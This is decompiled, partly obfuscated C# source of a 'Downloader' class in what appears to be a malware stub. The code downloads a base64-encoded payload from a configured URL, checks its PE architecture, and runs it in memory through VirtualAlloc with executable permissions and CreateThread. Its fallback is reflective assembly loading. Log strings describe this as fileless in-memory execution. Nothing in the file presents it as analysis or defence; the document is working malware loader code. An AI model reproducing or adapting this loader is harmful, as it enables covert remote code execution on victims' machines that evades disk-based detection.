using System;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000035 RID: 53
	internal sealed class Downloader
	{
		// Token: 0x060000FB RID: 251
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

		// Token: 0x060000FC RID: 252
		[DllImport("kernel32.dll")]
		private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		// Token: 0x060000FD RID: 253
		[DllImport("kernel32.dll")]
		private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

		// Token: 0x060000FE RID: 254
		[DllImport("kernel32.dll")]
		private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

		// Token: 0x060000FF RID: 255 RVA: 0x0000C4F0 File Offset: 0x0000A6F0
		public static async Task FilelessDownloaderAsync()
		{
			try
			{
				Logging.Log("[*] Starting cross-architecture in-memory execution", true);
				string url = Config.Downloader;
				Logging.Log("[*] Downloading payload...", true);
				string text = await Downloader.DownloadStringAsync(url);
				string base64EncodedExe = text;
				text = null;
				if (string.IsNullOrEmpty(base64EncodedExe))
				{
					Logging.Log("[-] Empty payload received", true);
				}
				else
				{
					Logging.Log("[*] Decoding payload...", true);
					byte[] exeBytes;
					try
					{
						exeBytes = Convert.FromBase64String(base64EncodedExe);
					}
					catch (FormatException)
					{
						Logging.Log("[-] Invalid Base64 format", true);
						return;
					}
					Logging.Log("[*] Detected architecture: " + (Environment.Is64BitProcess ? "x64" : "x86"), true);
					Logging.Log("[*] Attempting in-memory execution...", true);
					if (!Downloader.ExecuteInMemory(exeBytes))
					{
						Logging.Log("[-] Failed to execute in memory, trying reflection...", true);
						Downloader.ExecuteWithReflection(exeBytes);
					}
					Logging.Log("[+] Execution completed", true);
					url = null;
					base64EncodedExe = null;
					exeBytes = null;
				}
			}
			catch (Exception ex)
			{
				Logging.Log("[-] Error: " + ex.Message, true);
			}
		}

		// Token: 0x06000100 RID: 256 RVA: 0x0000C530 File Offset: 0x0000A730
		private static async Task<string> DownloadStringAsync(string url)
		{
			string text2;
			using (HttpClient client = new HttpClient())
			{
				client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
				string text = await client.GetStringAsync(url);
				text2 = text;
			}
			return text2;
		}

		// Token: 0x06000101 RID: 257 RVA: 0x0000C574 File Offset: 0x0000A774
		private static bool ExecuteInMemory(byte[] assemblyBytes)
		{
			bool flag;
			try
			{
				Downloader.PEArchitecture peArchitecture = Downloader.GetPeArchitecture(assemblyBytes);
				Downloader.PEArchitecture pearchitecture = (Environment.Is64BitProcess ? Downloader.PEArchitecture.X64 : Downloader.PEArchitecture.X86);
				if (peArchitecture != Downloader.PEArchitecture.AnyCPU && peArchitecture != pearchitecture)
				{
					Logging.Log(string.Format("[-] Architecture mismatch: Payload is {0}, process is {1}", peArchitecture, pearchitecture), true);
					flag = false;
				}
				else
				{
					IntPtr intPtr = Downloader.VirtualAlloc(IntPtr.Zero, (uint)assemblyBytes.Length, 12288U, 64U);
					if (intPtr == IntPtr.Zero)
					{
						Logging.Log("[-] VirtualAlloc failed", true);
						flag = false;
					}
					else
					{
						Marshal.Copy(assemblyBytes, 0, intPtr, assemblyBytes.Length);
						IntPtr intPtr2 = Downloader.CreateThread(IntPtr.Zero, 0U, intPtr, IntPtr.Zero, 0U, IntPtr.Zero);
						if (intPtr2 == IntPtr.Zero)
						{
							Logging.Log("[-] CreateThread failed", true);
							Downloader.VirtualFree(intPtr, 0U, 32768U);
							flag = false;
						}
						else
						{
							Downloader.WaitForSingleObject(intPtr2, uint.MaxValue);
							Downloader.VirtualFree(intPtr, 0U, 32768U);
							flag = true;
						}
					}
				}
			}
			catch (Exception ex)
			{
				Logging.Log("[-] Native execution failed: " + ex.Message, true);
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000102 RID: 258 RVA: 0x0000C69C File Offset: 0x0000A89C
		private static void ExecuteWithReflection(byte[] assemblyBytes)
		{
			try
			{
				Assembly assembly = Assembly.Load(assemblyBytes);
				MethodInfo entryPoint = assembly.EntryPoint;
				if (entryPoint != null)
				{
					object obj = assembly.CreateInstance(entryPoint.Name);
					entryPoint.Invoke(obj, null);
				}
				else
				{
					Logging.Log("[-] No entry point found in assembly", true);
				}
			}
			catch (Exception ex)
			{
				Logging.Log("[-] Reflection execution failed: " + ex.Message, true);
			}
		}

		// Token: 0x06000103 RID: 259 RVA: 0x0000C714 File Offset: 0x0000A914
		private static Downloader.PEArchitecture GetPeArchitecture(byte[] data)
		{
			Downloader.PEArchitecture pearchitecture;
			if (data.Length < 64)
			{
				pearchitecture = Downloader.PEArchitecture.Unknown;
			}
			else
			{
				int num = BitConverter.ToInt32(data, 60);
				if (num + 6 > data.Length)
				{
					pearchitecture = Downloader.PEArchitecture.Unknown;
				}
				else if (BitConverter.ToUInt32(data, num) != 17744U)
				{
					pearchitecture = Downloader.PEArchitecture.Unknown;
				}
				else
				{
					ushort num2 = BitConverter.ToUInt16(data, num + 4);
					ushort num3 = num2;
					ushort num4 = num3;
					if (num4 != 332)
					{
						if (num4 != 452)
						{
							if (num4 != 34404)
							{
								pearchitecture = Downloader.PEArchitecture.Unknown;
							}
							else
							{
								pearchitecture = Downloader.PEArchitecture.X64;
							}
						}
						else
						{
							pearchitecture = Downloader.PEArchitecture.ARM;
						}
					}
					else
					{
						pearchitecture = Downloader.PEArchitecture.X86;
					}
				}
			}
			return pearchitecture;
		}

		// Token: 0x06000104 RID: 260 RVA: 0x000038B4 File Offset: 0x00001AB4
		public Downloader()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000105 RID: 261 RVA: 0x000038AD File Offset: 0x00001AAD
		static Downloader()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}

		// Token: 0x02000036 RID: 54
		private enum PEArchitecture
		{
			// Token: 0x04000122 RID: 290
			Unknown,
			// Token: 0x04000123 RID: 291
			X86,
			// Token: 0x04000124 RID: 292
			X64,
			// Token: 0x04000125 RID: 293
			ARM,
			// Token: 0x04000126 RID: 294
			AnyCPU
		}
	}
}
